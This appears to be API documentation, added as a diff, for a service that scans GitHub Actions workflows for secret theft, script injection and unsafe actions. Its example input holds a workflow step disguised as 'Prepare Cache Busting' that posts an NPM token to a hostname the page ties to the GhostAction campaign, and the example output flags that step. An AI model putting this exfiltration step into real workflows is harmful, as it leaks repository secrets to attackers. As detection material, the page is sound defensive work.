@@ -1,0 +1,125 @@
+---
+title: "Analyze a GitHub Actions workflow"
+openapi: "POST /v1/github/workflows/analyze"
+description: "Find secret theft, script injection and risky actions in a GitHub Actions workflow."
+---
+
+Checks one workflow file for:
+
+* Secret theft, including patterns from GhostAction, Shai-Hulud and the tj-actions compromise
+* Script injection and unsafe `pull_request_target` checkouts
+* Actions from missing, new, forked or look-alike repositories
+* Unpinned actions, token permissions and other hardening issues
+
+Costs 2 units of your [rate limit](/getting-started/rate-limits). The workflow is analyzed in memory and not stored.
+
+## Request
+
+Send the YAML as the raw body:
+
+```bash
+curl -X POST https://api.custoden.com/v1/github/workflows/analyze \
+  --data-binary @.github/workflows/ci.yml
+```
+
+Or as JSON with `Content-Type: application/json`:
+
+```json
+{ "workflow": "on: push\njobs:\n  ..." }
+```
+
+The body can be up to 256 KB.
+
+## Example
+
+```yaml
+name: Github Actions Security
+on: [push, workflow_dispatch]
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Prepare Cache Busting
+        run: |
+          curl -s -X POST -d "NPM=${{ secrets.NPM_TOKEN }}" https://bold-dhawan.45-139-104-115.plesk.page
+```
+
+```json
+{
+  "workflow": { "name": "Github Actions Security", "triggers": ["push", "workflow_dispatch"], "jobs": 1 },
+  "summary": { "critical": 2, "high": 0, "medium": 0, "low": 2, "info": 0, "total": 4 },
+  "findings": [
+    {
+      "rule": "secret-exfiltration",
+      "severity": "critical",
+      "title": "Secrets sent to an untrusted endpoint",
+      "detail": "Step \"Prepare Cache Busting\" uses secrets and contacts 45-139-104-115.plesk.page, a throwaway hostname that maps to an IP address.",
+      "remediation": "Remove the step, rotate every secret it could read, and review who added it.",
+      "location": { "line": 9, "column": 14, "job": "send", "step": "Prepare Cache Busting" }
+    },
+    {
+      "rule": "campaign-indicator",
+      "severity": "critical",
+      "title": "Matches the GhostAction campaign",
+      "detail": "The workflow contains \"bold-dhawan.45-139-104-115.plesk.page\", an indicator published for GhostAction. ...",
+      "remediation": "Disable the workflow, rotate all secrets, and audit recent commits, runs and repository collaborators.",
+      "location": { "line": 10, "column": 69, "job": null, "step": null }
+    },
+    { "rule": "default-permissions", "severity": "low", "...": "..." },
+    { "rule": "unpinned-action", "severity": "low", "...": "..." }
+  ],
+  "actions": [
+    { "uses": "actions/checkout@v4", "owner": "actions", "repo": "checkout", "location": { "line": 7, "column": 15, "job": "send", "step": "actions/checkout@v4" } }
+  ],
+  "checks": {
+    "action_repositories": { "status": "complete", "checked": 1, "total": 1 }
+  }
+}
+```
+
+## Response
+
+| Field | Type | Description |
+|---|---|---|
+| `workflow.name` | string \| null | The workflow's `name` |
+| `workflow.triggers` | string[] | Events under `on` |
+| `workflow.jobs` | integer | Number of jobs |
+| `summary` | object | Count of findings per severity, plus `total` |
+| `findings` | array | Sorted by severity, then line. See [Workflow rules](/reference/workflow-rules) |
+| `actions` | array | Each third-party action or reusable workflow referenced, listed once |
+| `checks.action_repositories` | object | Status of the GitHub repository lookups. See below |
+
+### Finding
+
+| Field | Type | Description |
+|---|---|---|
+| `rule` | string | Stable rule ID |
+| `severity` | string | `critical`, `high`, `medium`, `low` or `info` |
+| `title` | string | One-line summary |
+| `detail` | string | What was found in this workflow |
+| `remediation` | string | How to fix it |
+| `location` | object | `line` and `column` (1-based), plus `job` and `step` when known |
+
+### Action repository checks
+
+The API looks up the repositories behind referenced actions. This catches references to owners that no longer exist (anyone can register the name and publish code there), recently created repositories, forks of popular actions, and renamed repositories.
+
+| Field | Description |
+|---|---|
+| `status` | `complete`, `partial` (not every action was looked up) or `skipped` (lookups temporarily unavailable) |
+| `checked` | Repositories looked up |
+| `total` | Third-party actions referenced |
+| `reason` | Present when not `complete` |
+
+Static findings are always returned, even when lookups are skipped.
+
+## Errors
+
+| Status | Code | When |
+|---|---|---|
+| 400 | `invalid_request` | Empty body, or JSON without a `workflow` string |
+| 400 | `invalid_json` | JSON body could not be parsed |
+| 413 | `payload_too_large` | Body exceeds 256 KB |
+| 422 | `invalid_workflow` | Not valid YAML, or no top-level `jobs` map. `details.line` and `details.column` are included |
+| 429 | `rate_limited` | See [Rate limits](/getting-started/rate-limits) |
